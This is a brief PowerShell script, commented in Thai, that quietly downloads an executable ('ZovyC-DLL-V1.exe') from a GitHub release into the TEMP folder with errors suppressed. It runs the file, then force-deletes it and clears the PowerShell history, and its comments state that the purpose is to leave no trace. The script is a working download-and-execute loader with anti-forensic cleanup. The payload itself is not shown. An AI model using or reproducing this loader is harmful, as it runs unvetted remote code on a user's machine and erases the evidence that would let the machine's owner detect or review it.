# 1. ตั้งค่าชื่อไฟล์และที่เก็บ (ใช้ชื่อตามที่คุณต้องการ)
$fileName = "ZovyC-DLL-V1.exe"
$tempPath = "$env:TEMP\$fileName"

# 2. ลิงก์ตรงของไฟล์ EXE (รอเอาลิงก์จาก GitHub มาใส่)
$url = "https://github.com/joker55za66-ops/ZovyC-DLL-V1/releases/download/v1/ZovyC-DLL-V1.exe"

# 3. เริ่มการดาวน์โหลดแบบเงียบ
# (ใช้ -ErrorAction SilentlyContinue เพื่อไม่ให้โชว์ตัวแดงถ้ามีปัญหาเล็กน้อย)
Invoke-WebRequest -Uri $url -OutFile $tempPath -ErrorAction SilentlyContinue

# 4. ตรวจสอบว่าโหลดไฟล์มาสำเร็จหรือไม่ก่อนสั่งรัน
if (Test-Path $tempPath) {
    
    # สั่งรัน EXE และใช้คำสั่ง -Wait เพื่อให้ PowerShell "รอ" จนกว่าคุณจะปิดโปรแกรม
    Start-Process -FilePath $tempPath -Wait
    
    # 5. เมื่อโปรแกรมปิดลง (หายไปจากหน้าจอ) ให้ลบไฟล์ออกจาก Temp ทันที
    # -Force คือการสั่งลบแบบบังคับ (ถ้าไฟล์ถูกล็อคอยู่จะพยายามลบให้ได้)
    Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
}

# 6. ลบประวัติการใช้คำสั่งใน Session นี้ออก (เพื่อไม่ให้เหลือร่องรอยใน History ของ PowerShell)
Clear-History